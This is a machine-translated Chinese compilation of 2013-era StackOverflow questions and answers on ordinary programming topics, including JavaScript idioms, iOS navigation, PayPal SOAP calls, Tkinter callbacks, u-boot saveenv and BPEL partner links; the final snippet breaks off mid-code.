# StackOverflow 问答 16215000-16215999

# javascript - 为什么在 JS 库中重复变量名并添加“或对象”是常见的做法

> ID：16215003
> 
> 赞同：3
> 
> 时间：2013-04-25T12:38:25.697
> 
> 标签：javascript, oop

我试图更好地掌握 JS 语法，我想知道为什么许多库中的常见做法是在已声明具有相同名称的变量之后重复对象名称。请看下面：

```
var Backbone = Backbone || {};    // <= Why the duplication? 
```

或者

```
var listeners = this._listeners || (this._listeners = {}); 
```

**更新：**

经过进一步研究，我发现了一篇写得很好的[文章](http://javascriptissexy.com/12-simple-yet-powerful-javascript-tips/)，它评估了许多惯用语。

文章还解释了立即调用函数表达式 (IIFE) 背后的用法，即将函数包装在函数中，如下所示：

```
(function() {
  console.log('Hello!');
})(); 
```

这是像我这样的新手不能完全理解的另一种 JS 脑筋急转弯。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-25T12:39:57.910

```
var Backbone = Backbone || {}; 
```

表示如果`Backbone`是`undefined`或`null`或`false`，将其设置为`{}`

* * *

更长的解释：

**赋值运算符**从右到**左**计算，逻辑**运算符**（即使 Javascript 没有真正的逻辑运算符，因为它们也适用于**非****布尔****操作**数）从左到右**计算**。

 ******类似的表达式`A || B`返回`B`if `A`is `undefined`, `null`, or `false`。

因此，如果它已经有一个值，则`A = A || B`要么保留值，要么分配给.`A``B``A`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T12:59:21.447

```
var Backbone = Backbone || {}; 
```

正如其他人所解释的，此代码将执行以下操作：

*   声明一个变量Backbone，检查变量Backbone是否已经存在于范围内，
*   如果是，则将该对象（在 JS 中一切都是对象）分配给我们声明的变量（顺便提一下，该变量具有相同的名称）
*   如果没有，它将创建一个新的空对象。

这样做的目的是模块化。假设您正在加载几个 Backbone 插件，以及裸 Backbone。

*   首先，您加载了基础主干。
*   该脚本检查根范围对象是否检查根范围对象Backbone是否存在（即window.Backbone）
*   它没有，所以我们创建一个空的并用它做一些事情。
*   现在，下一个插件脚本检查根对象 Backbone 是否存在（它确实存在）
*   由于它确实存在，它不会创建一个新的空对象，而是使用现有的
*   现在它是这样的，直到你所有的插件都被加载。

这并不完全正确，但会发生类似的事情。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-04-25T12:40:45.050

这是一种仅在尚未分配变量时才默认变量值的方法。您可以将其视为 JS 使用默认值执行可选函数参数的方式。******

# ios - UITableView 自动选择行

> ID：16215004
> 
> 赞同：0
> 
> 时间：2013-04-25T12:38:26.050
> 
> 标签：ios, xcode, uitableview, row

加载时`UITableView`，我希望选择唯一部分中的唯一行，以便在`didSelectRowAtIndexPath`用户加载`UITableView`. 我已经尝试了下面的代码，但它没有执行该`didSelectRowAtIndexPath`部分中的代码。有什么想法吗？

```
NSIndexPath *indexedPath = [NSIndexPath indexPathForRow:0 inSection:0];
[tableView selectRowAtIndexPath:indexedPath animated:YES scrollPosition: UITableViewScrollPositionNone]; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T12:47:36.360

使用此代码。加载视图时将自动调用`didSelectRowAtIndexPath`。

```
 [self tableView:tableView didSelectRowAtIndexPath:[NSIndexPath indexPathForItem:0 inSection:0]]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T12:52:06.097

如果您需要调用您正在使用的某些功能，`didSelectRowAtIndexPath`您可以创建一个单独的方法并将所有逻辑`didSelectRowAtIndexPath`放在您的单独方法中，然后从`didSelectRowAtIndexPath`您想要调用相同代码的其他任何地方调用该方法？

如果你想在 didSelectRowAtIndexPath 方法中额外触发事件，你需要手动调用委托方法，它不会自动发生：

```
[self tableView:self.tableView didSelectRowAtIndexPath:your_indexpath]; 
```

希望它可以帮助你。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-09-08T07:05:14.547

迅速

```
let indexPath = IndexPath(row: 0, section: 0)
tableView.selectRow(at: indexPath, animated: false, scrollPosition: .bottom)
tableView.delegate?.tableView?(tableView, didSelectRowAt: indexPath) 
```

# ios - Sphero 在 iPhone 5 上的模态视图？

> ID：16215009
> 
> 赞同：0
> 
> 时间：2013-04-25T12:38:28.677
> 
> 标签：ios, sphero-api

我注意到 Sphero 模态视图没有覆盖 iPhone5 上的整个父视图，我无法更改笔尖。我可以设置一个属性来使模态视图覆盖整个父视图吗？

![颜色选择器模式视图](https://i.stack.imgur.com/I9KKj.png)

此外，No Sphero Connected 模态视图看起来不适合 Portrait (RUINoSpheroConnectedViewController_Portrait)

![RUINoSpheroConnectedViewController_Portrait](https://i.stack.imgur.com/BSeLW.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-26T15:45:08.700

这不是预期的行为，我们已经注意到它，我们正在努力解决它。

现在，您可以通过在视图控制器的 viewDidLoad 方法中将视图的边界设置为父视图的边界来解决颜色选择器视图的问题`colorPickerView.bounds = self.view.bounds`：

# c# - 贝宝 DoReferenceTransaction

> ID：16215010
> 
> 赞同：2
> 
> 时间：2013-04-25T12:38:30.720
> 
> 标签：c#, paypal, paypal-sandbox

我用 C#调用进程[DoReferenceTransaction (SOAP) 。](https://www.x.com/developers/paypal/documentation-tools/api/doreferencetransaction-api-operation-soap)它运行良好，数据到达并且结果`DoReferenceTransactionResponseType`没有错误。但细节`DoReferenceTransactionResponseDetails`永远是空的。

是否有任何变量可以**填充**响应中的详细信息？我在其中找到了一个 XML 字符串，`DoReferenceTransactionResponseDetails.Any`但如果它在其中，为什么我要从 xml 中排除数据`DoReferenceTransactionResponseDetails`？

我必须拥有的是`TransactionID`来自 PayPal 的。

谢谢

请求示例：

```
 request = new DoReferenceTransactionReq();
  request.DoReferenceTransactionRequest = new DoReferenceTransactionRequestType();
  request.DoReferenceTransactionRequest.Version = "98.0";
  request.DoReferenceTransactionRequest.DoReferenceTransactionRequestDetails = new DoReferenceTransactionRequestDetailsType();
  request.DoReferenceTransactionRequest.DoReferenceTransactionRequestDetails.PaymentAction = PaymentActionCodeType.Sale;
  request.DoReferenceTransactionRequest.DoReferenceTransactionRequestDetails.PaymentType = MerchantPullPaymentCodeType.Any;
  request.DoReferenceTransactionRequest.DoReferenceTransactionRequestDetails.PaymentDetails = new PaymentDetailsType();
  request.DoReferenceTransactionRequest.DoReferenceTransactionRequestDetails.PaymentDetails.OrderTotal = new BasicAmountType();
  request.DoReferenceTransactionRequest.DoReferenceTransactionRequestDetails.PaymentDetails.OrderTotal.Value = "100";
  request.DoReferenceTransactionRequest.DoReferenceTransactionRequestDetails.PaymentDetails.OrderTotal.currencyID = CurrencyCodeType.CHF;
  request.DoReferenceTransactionRequest.DoReferenceTransactionRequestDetails.ReferenceID = "XXXX";

  DoReferenceTransactionResponseType response = service.DoReferenceTransaction(request); 
```

[来自上层请求的响应](http://i.stack.imgur.com/G543M.png)

交易已成功处理，我可以在贝宝沙盒的页面概述中看到它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:24:43.983

您应该得到带有值的响应。它不应该为空。例如，我正在传递以下内容：

```
<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="urn:ebay:apis:eBLBaseComponents" xmlns:ns2="urn:ebay:api:PayPalAPI">
  <SOAP-ENV:Header>
    <ns2:RequesterCredentials>
      <ns1:Credentials>
        <ns1:Username>%Username%</ns1:Username>
        <ns1:Password>%Password%</ns1:Password>
        <ns1:Signature>%Signature%</ns1:Signature>  
      </ns1:Credentials>
    </ns2:RequesterCredentials>
  </SOAP-ENV:Header>
  <SOAP-ENV:Body>
    <ns2:DoReferenceTransactionReq>
      <ns2:DoReferenceTransactionRequest>
        <ns1:Version>84.0</ns1:Version>
        <ns1:DoReferenceTransactionRequestDetails>  
          <ns1:ReferenceID>1A381834JN903220E</ns1:ReferenceID>  
          <ns1:PaymentAction>Sale</ns1:PaymentAction>
          <ns1:PaymentType>Any</ns1:PaymentType>
          <ns1:PaymentDetails>
            <ns1:OrderTotal currencyID="USD">10.00</ns1:OrderTotal>
            <ns1:PaymentAction>Sale</ns1:PaymentAction>
          </ns1:PaymentDetails>
          <ns1:IPAddress>10.243.180.150</ns1:IPAddress>
        </ns1:DoReferenceTransactionRequestDetails>
      </ns2:DoReferenceTransactionRequest>
    </ns2:DoReferenceTransactionReq>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope> 
```

我在 API 响应中返回以下内容：

```
Array
(
    [name] => DoReferenceTransactionResponse
    [elements] => Array
        (
            [0] => Array
                (
                    [name] => Timestamp
                    [text] => 2013-04-25T13:22:14Z
                )

            [1] => Array
                (
                    [name] => Ack
                    [text] => Success
                )

            [2] => Array
                (
                    [name] => CorrelationID
                    [text] => 748fcba0bc2e7
                )

            [3] => Array
                (
                    [name] => Version
                    [text] => 84.0
                )

            [4] => Array
                (
                    [name] => Build
                    [text] => 5650305
                )

            [5] => Array
                (
                    [name] => DoReferenceTransactionResponseDetails
                    [elements] => Array
                        (
                            [0] => Array
                                (
                                    [name] => Amount
                                    [text] => 10.00
                                )

                            [1] => Array
                                (
                                    [name] => AVSCode
                                    [text] => X
                                )

                            [2] => Array
                                (
                                    [name] => CVV2Code
                                    [text] => M
                                )

                            [3] => Array
                                (
                                    [name] => TransactionID
                                    [text] => 2PR97363S20425407
                                )

                        )

                )

        )

) 
```

# java - 如何从android中的谷歌应用引擎数据存储中获取数据

> ID：16215021
> 
> 赞同：1
> 
> 时间：2013-04-25T12:39:19.260
> 
> 标签：java, android, eclipse, google-app-engine

我是谷歌应用引擎的新手，我仔细阅读了[https://developers.google.com/appengine/docs/](https://developers.google.com/appengine/docs/)上的文档。现在我已经通过在 Eclipse 中创建网络应用程序成功地将我的数据存储在谷歌应用引擎商店中例如，我在 GAE 商店存储员工的名字和姓氏，例如

```
DatastoreService datastore = DatastoreServiceFactory.getDatastoreService();

Entity employee = new Entity("Employee");

employee.setProperty("firstName", "Antonio");
employee.setProperty("lastName", "Salieri");

Date hireDate = new Date();
employee.setProperty("hireDate", hireDate);

employee.setProperty("attendedHrTraining", true);

datastore.put(employee); 
```

我也将我的项目部署到 GAE，但现在我想从我的 android 应用程序的数据存储中获取存储的数据。这可能吗？任何帮助我都会非常感激。

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T14:16:58.730

这个问题有不同的方法。通常您会创建某种服务，最有可能是 JSON 格式，然后您就可以使用 HTTP 请求从您的 Android 应用程序与 Google App Engine 进行交互。更好的解决方案是使用[Google Cloud Endpoints](https://developers.google.com/appengine/docs/java/endpoints/overview)：

> Google Cloud Endpoints 包含工具、库和功能，可让您从 App Engine 后端生成 Endpoints 和客户端库，以简化客户端对该 Web 应用程序的访问。Endpoints 可以更轻松地为 Web 客户端和移动客户端（例如 Android 或 Apple 的 iOS）创建 Web 后端。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-06-11T07:14:37.867

```
 DatastoreService datastore = DatastoreServiceFactory.getDatastoreService();
        Query q = new Query("Student");

        PreparedQuery pq = datastore.prepare(q);

        for (Entity entity : pq.asIterable()) 
{

        String nm=(String)entity.getProperty("Name");
        String em=(String)entity.getProperty("E-Mail");
    }
     resp.getWriter().println((String)entity.getProperty("Name"));

          resp.getWriter().println((String)entity.getProperty("E-Mail")); 
```

# java - 如何正确地将数据添加到 GXT Grid？

> ID：16215028
> 
> 赞同：0
> 
> 时间：2013-04-25T12:39:35.553
> 
> 标签：java, gxt, asynccallback

我有一个 webapp，我需要从文件中获取一些数据并填写到表格中。这是带有此表的页面的代码：

```
public class Rules extends ContentPanel{
    private final ServerManagementAsync serverManagementSvc = GWT.create(ServerManagement.class);
    private ArrayList<PropertyItem> propslist;
    private ArrayList<PropertyItem> itemArrayList;
    private EditorGrid<PropertyItem> grid;

    public Rules(final String customerId){
        setLayout(new FlowLayout(10));

        List<ColumnConfig> configs = new ArrayList<ColumnConfig>();

        ColumnConfig column = new ColumnConfig();
        column.setId("name");
        column.setHeader("Name");
        column.setWidth(220);

        TextField<String> text = new TextField<String>();
        text.setAllowBlank(false);
        column.setEditor(new CellEditor(text));
        configs.add(column);

        column = new ColumnConfig();
        column.setId("type");
        column.setHeader("Type");
        column.setWidth(220);

        TextField<String> typeText = new TextField<String>();
        typeText.setAllowBlank(false);
        column.setEditor(new CellEditor(typeText));
        configs.add(column);

        column = new ColumnConfig();
        column.setId("value");
        column.setHeader("Value");
        column.setWidth(220);
        configs.add(column);

        final ListStore<PropertyItem> store = new ListStore<PropertyItem>();
        propslist = getPropslist(customerId);

        for (PropertyItem propertyItem: propslist){
            store.insert(propertyItem, 0);
        }

        ColumnModel cm = new ColumnModel(configs);

        setHeading("Settings");
        setFrame(true);
        setWidth(600);
        setLayout(new FitLayout());

        grid = new EditorGrid<PropertyItem>(store, cm);
        grid.setAutoExpandColumn("name");
        grid.setBorders(true);
        add(grid);

        ToolBar toolBar = new ToolBar();
        setTopComponent(toolBar);
        setButtonAlign(Style.HorizontalAlignment.RIGHT);

        addButton(new Button("Refresh", new SelectionListener<ButtonEvent>() {
            @Override
            public void componentSelected(ButtonEvent ce) {
                store.insert(getPropslist(customerId), 5);
            }
        }));
        addButton(new Button("Add", new SelectionListener<ButtonEvent>() {

            @Override
            public void componentSelected(ButtonEvent ce) {
                store.commitChanges();
            }
        }));

    }

    public ArrayList<PropertyItem> getPropslist(String customerId){
        itemArrayList = new ArrayList<PropertyItem>();
        AsyncCallback<ArrayList<PropertyItem>> callback = new AsyncCallback<ArrayList<PropertyItem>>() {
            @Override
            public void onFailure(Throwable throwable) {

            }

            @Override
            public void onSuccess(ArrayList<PropertyItem> propertyItems) {
                itemArrayList = propertyItems;
                Window.alert("read successful");
                }
            }
        };
        serverManagementSvc.getProperties(customerId, callback);
        return itemArrayList;
    }
} 
```

当我运行我的应用程序时，我只看到列名，单元格中没有数据（当然也没有单元格）。作为示例，我使用了这个：[Ext GWT 2.2.6 Explorer(Grid)](http://www.sencha.com/examples-2/#autoheightgrid)

我不明白是什么导致了这样的问题。这可能是什么原因？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T18:16:24.867

因为您的 propsList 是异步填充的，所以在服务器调用返回之前呈现网格。

要解决此问题，首先将商店设为像网格一样的私有财产

接下来，移动填充商店的代码：

```
 for (PropertyItem propertyItem: propslist){
        store.insert(propertyItem, 0);
    } 
```

进入`onSuccess`回调的方法。

最后，您可能还需要调用 : `grid.reconfigure(grid.getStore(), grid.getColumnModel());` 只是为了让 Grid 再次渲染。

# ios - 通过initWithRootViewController以外的方法设置UINavigationController的rootViewController

> ID：16215034
> 
> 赞同：86
> 
> 时间：2013-04-25T12:40:04.217
> 
> 标签：ios, uinavigationcontroller, uitoolbar, iphone-5

如何通过 以外的方法设置`rootViewController`of ？`UINavigationController``initWithRootViewController`

我想使用`initWithNavigationBarClass:toolbarClass:`为我的 NavigationController 提供自定义工具栏，所以我认为我不能使用`initWithRootViewController`.

* * *

## 回答 #1

> 赞同：158
> 
> 时间：2013-04-25T12:45:40.673

你可以通过调用来解决这个问题`setViewControllers`。

像这样：

```
UINavigationController *navigationController = [[UINavigationController alloc] initWithNavigationBarClass:[MyNavigationBar class] toolbarClass:[UIToolbar class]];

[navigationController setViewControllers:@[yourRootViewController] animated:NO]; 
```

斯威夫特版本：

```
let navigationController = UINavigationController(navigationBarClass: MyNavigationBar.self, toolbarClass: UIToolbar.self)

navigationController.setViewControllers([yourRootViewController], animated: false) 
```

* * *

## 回答 #2

> 赞同：30
> 
> 时间：2015-04-25T06:40:13.757

**使用 Swift 进行知识共享：**

从 app delegate.swift 以外的类更改根视图控制器

```
let appdelegate = UIApplication.sharedApplication().delegate as! AppDelegate
let mainStoryboard: UIStoryboard = UIStoryboard(name: "Main", bundle: nil)
var homeViewController = mainStoryboard.instantiateViewControllerWithIdentifier("HomeViewController") as! HomeViewController
let nav = UINavigationController(rootViewController: homeViewController)
appdelegate.window!.rootViewController = nav 
```

希望这对某人有帮助。

使用动画更改 rootviewcontroller 可以通过以下方式实现：

```
UIView.transitionWithView(self.window!, duration: 0.5, options: UIViewAnimationOptions.TransitionFlipFromLeft, animations: {
    self.window?.rootViewController = anyViewController
}, completion: nil) 
```

我们也可以写一个通用的方法，类似于[这个。](https://gist.github.com/nvkiet/6368d1d45c4ea3e6d9cb)

* * *

## 回答 #3

> 赞同：15
> 
> 时间：2016-08-15T12:27:59.120

这个对我有用，希望对你有帮助

```
let rootVC:LoginViewController = self.storyboard?.instantiateViewControllerWithIdentifier("LoginViewController") as! LoginViewController
let nvc:UINavigationController = self.storyboard?.instantiateViewControllerWithIdentifier("RootNavigationController") as! UINavigationController
nvc.viewControllers = [rootVC]
UIApplication.sharedApplication().keyWindow?.rootViewController = nvc 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2016-11-01T20:50:52.073

在 swift 3.0 xcode8.1

在主界面中的常规设置中删除： Main <-this 在主界面之后：

```
class AppDelegate...

 var window: UIWindow?

    fun application...

      window = UIWindow(frame: UIScreen.main.bounds)
      window?.makeKeyAndVisible()
      window?.rootViewController = UINavigationController(rootViewController: NewYourController) 
```

* * *

## 回答 #5

> 赞同：-3
> 
> 时间：2016-01-12T13:55:42.467

```
 let storyboard = UIStoryboard(name: "Main", bundle: nil)         
  let yourNewRootView = storyboard.instantiateViewControllerWithIdentifier("yourNewRootView") as? yourNewRootView

   self.window = UIWindow(frame: UIScreen.mainScreen().bounds)

    UIView.transitionWithView(self.window!, duration: 0.1, options: [UIViewAnimationOptions.TransitionFlipFromRight,UIViewAnimationOptions.TransitionFlipFromLeft], animations: 
    {
        // animation

        }, completion: { (finished: Bool) -> () in

            self.window?.rootViewController = nil
            self.window?.rootViewController = yourNewRootView
            self.window?.makeKeyAndVisible()
    }) 
```

# javascript - BlockUI 滚动到顶部

> ID：16215038
> 
> 赞同：0
> 
> 时间：2013-04-25T12:40:10.677
> 
> 标签：javascript, jquery

我正在使用 JQuery BlockUI 插件：

```
function block(msg) {
    $.blockUI({
        message: msg,
        css: {
            border: 'none',
            padding: '15px',
            backgroundColor: '#000',
            '-webkit-border-radius': '10px',
            '-moz-border-radius': '10px',
            opacity: .8,
            color: '#fff'
        }
    });
}

function unblock() {
    $.unblockUI();
} 
```

我面临的问题是，一旦我调用它，它就会将我的页面滚动到顶部。情况不妙。

这是生成的html：

![在此处输入图像描述](https://i.stack.imgur.com/qRJrJ.png)

有什么我可以修改的，这样它就不会触及 pageoffset / 滚动？有什么我可以做的来保存它吗？

谢谢

在这里调用：

```
function callBump(realid) {

    block('Bumping...');

    $.ajax({
        type: "POST",
        url: "CalendarServices.aspx/Bump",
        data: 'id=' + realid,
        success: function (data) {
            $('#calendar').fullCalendar('refetchEvents');
            unblock();
        }
,
        error: function () {
            unblock();
        }
    });
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T12:49:47.810

我猜想跳到顶部是由这样的事情引起的：

```
<a href="#" id="do_bump">Bump!</a> 
```

无论您绑定到该链接的点击事件是否正在执行，但它会继续尝试导航到导致跳转的“#”。

它可以通过捕获事件参数（添加`e`到您的点击事件处理程序）并调用它来修复`preventDefault()`。这可以防止发生默认的链接单击行为，即导航到`href`属性值。

鉴于你的意见，你有这个：

```
$(btnBump).off('click'); 
$(btnBump).on('click', function () { 
    callBump(event.realid); 
}); 
```

`event`来自哪里？这是`window.event`吗？假设 jQuery 可能会破坏你的事件，试试这个（你只需要添加事件参数`e`）：

```
$(btnBump).on('click', function(e) {
    callBump(event.realid);
    e.preventDefault();
}); 
```

# android - Android - imageview.setBackgroundResource 问题

> ID：16215041
> 
> 赞同：3
> 
> 时间：2013-04-25T12:40:15.000
> 
> 标签：android, android-animation, android-imageview

我有一个图像视图，已设置为 400dp（宽度）和 300dp（高度）。此图像视图用于列表视图，我从 url 加载图像。在加载图像期间，我显示了一个类似动画的进度条，设置如下：

```
imageView.setBackgroundResource(R.drawable.progress);
            final AnimationDrawable startAnimation = (AnimationDrawable) imageView
                    .getBackground();

            startAnimation.start(); 
```

图像加载完成后，我将删除此动画并设置加载的图像，如下所示：

```
imageView.setBackgroundResource(0);
            imageView.setImageBitmap(bitmap); 
```

但问题是，动画也是采用指定的宽度和高度，即分别为 400dp 和 300dp，如何单独减小可绘制动画的大小？

我的动画文件：progress.xml

```
<?xml version="1.0" encoding="utf-8"?>
<animation-list xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/anim_black"
    android:oneshot="false" >

    <item
        android:drawable="@drawable/frame_1"
        android:duration="100"/>
    <item
        android:drawable="@drawable/frame_2"
        android:duration="100"/>
    <item
        android:drawable="@drawable/frame_3"
        android:duration="100"/>
    <item
        android:drawable="@drawable/frame_4"
        android:duration="100"/>
    <item
        android:drawable="@drawable/frame_5"
        android:duration="100"/>
    <item
        android:drawable="@drawable/frame_6"
        android:duration="100"/>
    <item
        android:drawable="@drawable/frame_7"
        android:duration="100"/>
    <item
        android:drawable="@drawable/frame_8"
        android:duration="100"/>
    <item
        android:drawable="@drawable/frame_9"
        android:duration="100"/>
    <item
        android:drawable="@drawable/frame_10"
        android:duration="100"/>
    <item
        android:drawable="@drawable/frame_11"
        android:duration="100"/>
    <item
        android:drawable="@drawable/frame_12"
        android:duration="100"/>

</animation-list> 
```

第 1 帧，第 2 帧 ....第 12 帧是我通过拆分 gif 图像获得的 png 文件。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T12:49:25.480

在您的情况下，您应该使用`setImageResource`动画。背景图像总是被缩放以适应整个图像。您还需要`ScaleType`在开始动画之前和加载图像之后更改 a 。

```
imageView.setImageResource(R.drawable.progress);
imageView.setScaleType(ScaleType.CENTER);

final AnimationDrawable startAnimation = (AnimationDrawable) imageView.getDrawable();
startAnimation.start();

// and once image is loaded
imageView.setImageBitmap(bitmap);
imageView.setScaleType(ScaleType.CENTER_INSIDE); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T12:52:13.533

来吧伙计。你正在做更长的路。最好为您的目的使用自定义进度条。您需要做的是使用与您的 Imageview 相同大小的框架布局，并将进度条和您的 imageview 放入您的 imageview 上方的同一视图中。加载图像后，将进度条的可见性更改为 View.GONE 或 View.INVISIBLE。它也可以在列表视图中公平使用，而不会出现任何内存问题。要实现自定义进度条，请使用此。

```
 <ProgressBar
         android:layout_width="wrap_content"
         android:layout_height="wrap_content"
         android:indeterminateDrawable="@anim/progress_bar_anim" >
      </ProgressBar> 
```

你可以绘制的progress_bar_anim.xml在哪里

```
 <?xml version="1.0" encoding="utf-8"?>
  <animated-rotate xmlns:android="http://schemas.android.com/apk/res/android"
    android:drawable="@drawable/pro_indi"
    android:pivotX="50%"
    android:pivotY="50%" /> 
```

pro_indi 是要旋转的任何圆形图像。

```
<FrameLayout>
     <ImageView>
     <Progressbar>
</FrameLayout> 
```

# python - 类型错误： () 不带参数（1 给定）

> ID：16215045
> 
> 赞同：15
> 
> 时间：2013-04-25T12:40:28.370
> 
> 标签：python, lambda, tkinter

我是 python 编程的新手，仍在尝试弄清楚 lambda 的用法。经过大量谷歌搜索后，我正在开发一些 gui 程序，我认为我需要使用它来让按钮按照我的需要工作

**这行得通**

```
mtrf = Button(root, text = "OFF",state=DISABLED,command = lambda:b_clicked("mtrf")) 
```

但是当我对Scale做同样的事情时它**不起作用**

```
leds = Scale(root,from_=0,to=255, orient=HORIZONTAL,state=DISABLED,variable =num,command =lambda:scale_changed('LED')) 
```

* * *

## 回答 #1

> 赞同：38
> 
> 时间：2013-04-25T12:41:54.557

`Scale`调用作为`command`一个参数传递的函数，因此您必须使用它（尽管立即将其丢弃）。

改变：

```
command=lambda: scale_changed('LED') 
```

至

```
command=lambda x: scale_changed('LED') 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-04-25T12:42:33.177

这可能是因为该命令传递了一个您可能不想要的参数。尝试将 lambda 从

```
command=lambda:scale_changed('LED') 
```

至

```
command=lambda x:scale_changed('LED') 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-25T12:49:38.733

您应该查阅 Tkinter[文档](http://infohost.nmt.edu/tcc/help/pubs/tkinter/web/scale.html)：

> 缩放小部件
> 
> `command`- 每次移动滑块时调用的过程。此过程将传递一个参数，即新的比例值。如果滑块快速移动，您可能不会收到所有可能位置的回调，但当它稳定时您肯定会收到回调。
> 
> * * *
> 
> 按钮小部件
> 
> `command`- 单击按钮时要调用的函数或方法。

改变你`lambda`的

```
command=lambda new_scale_val: scale_changed('LED') 
```

# environment-variables - saveenv 在 u-boot 中是如何实现的？

> ID：16215047
> 
> 赞同：2
> 
> 时间：2013-04-25T12:40:31.980
> 
> 标签：environment-variables, u-boot

当我们执行`saveenv`after `setenv`. 我可以找到`printenv`and `setenv`，但没有`saveenv`。有人可以解释一下吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-26T01:06:20.933

这取决于平台配置的非易失性存储。在任何情况下，都会构建 common/nv_edit.c。但是（例如）如果 env 存在于 SPI 闪存中，那么 common/env_sf.c 中的 saveenv() 将被构建和链接。执行“grep saveenv common/*.c”，您会看到其他存储选项（eeprom、flash、mmc、nand 等）。

任何平台的 CONFIG_ 选项都在 include/configs/ 下的相应 .h 中。将 ENV 相关选项与存储选项进行比较，这应该会导致适合您平台的代码的正确部分。

# java - java中方法的类型转换

> ID：16215049
> 
> 赞同：-1
> 
> 时间：2013-04-25T12:40:35.073
> 
> 标签：java, casting

这段代码有什么问题？考虑构建一个包含所有建筑物的 ArrayList，而 Building 是 Farm 和 StoneMine 的超类：

```
public Building returnBuilding(int i)
{
    if(buildings.get(i) instanceof Farm)
        return (Farm)buildings.get(i);
    if(buildings.get(i) instanceof StoneMine)
        return (StoneMine)buildings.get(i); 
    else
        return null;
} 
```

那么如果我打电话

```
returnBuilding(1).SOMEMETHODEJUSTINFARMCLASS(); 
```

这`building.get(1)`是 Farm 类的一个实例，我得到一个运行时错误

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T12:46:07.540

`returnBuilding`返回 a `Building`，而不是 a `Farm`。在返回之前进行铸造`game.buildings.get(i)`并不会改变这一点。

如果运行时类`game.buildings.get(i)`is ，则在调用方法之前`Farm`将返回值转换为`returnBuilding`to 。`Farm``SOMEMETHODEJUSTINFARMCLASS`

# android - 允许与特定应用程序的网络连接

> ID：16215050
> 
> 赞同：0
> 
> 时间：2013-04-25T12:40:35.153
> 
> 标签：android, iphone, network-programming

我正在为一家公司开发一个用于移动（iPhone 和 Android）地图的应用程序。该公司已经部署了一个无线网络，通过订阅允许互联网访问。

移动应用程序的想法是仅向拥有该特定应用程序的任何人提供互联网访问权限。换句话说，公司希望允许应用程序连接到该网络。

我的问题是：是否可以仅授予对特定应用程序的访问权限，最合适的方式是什么？“识别”该网络或网络负责的应用程序是否可以访问该特定应用程序？任何建议都非常感谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T12:44:49.710

一般来说，普通的 WiFi 网络不会有任何设施允许单个应用程序访问它。移动设备操作系统将自身与 WiFi 网络相关联，它将允许所有应用程序访问它。

但是，您可以使用需要身份验证的代理服务器。然后，您可以将身份验证密钥（例如，客户端证书）构建到应用程序中，这样只有应用程序才能通过代理进行通信。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-25T12:45:24.700

如果您只想提供连接到任何网络的应用程序，那么您需要在`IPTABLES in linux`核心（`this needs your application to have root access`）中放置一些规则，就像用于监控访问网络的应用程序的**UID**`firewall applications`的for android

 **但是你可以用另一种方式来做，实现一些服务器调用，公司的特定网络只能通过那个特定的应用程序访问，在 http 请求中使用一些验证，例如维护一个`unique ID`来区分你可以在期间创建的应用程序/用户注册和与网络交互期间`use the key for validation`。**

# python - Feincms ApplicationContent 覆盖上下文

> ID：16215056
> 
> 赞同：2
> 
> 时间：2013-04-25T12:40:53.027
> 
> 标签：python, django, feincms

如果我添加`ApplicationContent`到 feincms 页面上的区域，如何更新`feincms_page's`上下文？

> **用例**
> 
> 将 feincms_page 的标题更改为应用程序内容的标题

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-05-12T12:05:54.680

使用`fragment` [模板标签](http://www.feinheit.ch/media/labs/feincms/api/templatetags.html)

**应用模板：**

```
{% fragment request "frag_title" %} my title {% endfragment %} 
```

**继承模板：**

```
{% if request|has_fragment:"frag_title" %}
    <title>{% get_fragment request "frag_title" %}</title>
{% else %}
    <title>{{ feincms_page.title }}</title>
{% endif %} 
```

# bpel - 对于 BPEL 中对同一 Web 服务的两次不同调用，我是否需要两个不同的 PartnerLink？

> ID：16215059
> 
> 赞同：2
> 
> 时间：2013-04-25T12:41:13.700
> 
> 标签：bpel

如果我想对 中的同一个 Web 服务进行两次并行调用（在一个流活动中）`BPEL`，我需要创建两个不同`PartnerLinks`的还是可以使用同一个？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-25T13:11:36.227

您可以在`partnerLink`同一个`flow`. 您不需要定义一个新的。

但是，如果您期望调用的结果，则需要 different `outputVariables`。如果您并行写入相同`variable`的内容，您将像在任何其他编程语言中一样遇到竞争条件。

# jquery - 如何使用原生 javascript 编写 jquery $.getJSON 函数？

> ID：16215061
> 
> 赞同：2
> 
> 时间：2013-04-25T12:41:15.797
> 
> 标签：jquery, ajax, getjson

一个演示我只想使用jquery`$.getJSON`函数，但现在我必须导入jquery，所以我想使用原生javascript编写jquery`$.getJSON`函数。

我的代码是：

```
var $={
    getJSON: function(url, params, callback){
        var reqUrl = url;
        var xhr = new XMLHttpRequest;
        xhr.onreadystatechange = function() {
            if (xhr.readyState == 4 && xhr.status == 200) {
                JSON.parse(xhr.responseText);
            }
        }
        xhr.open("GET", reqUrl);
        xhr.send();
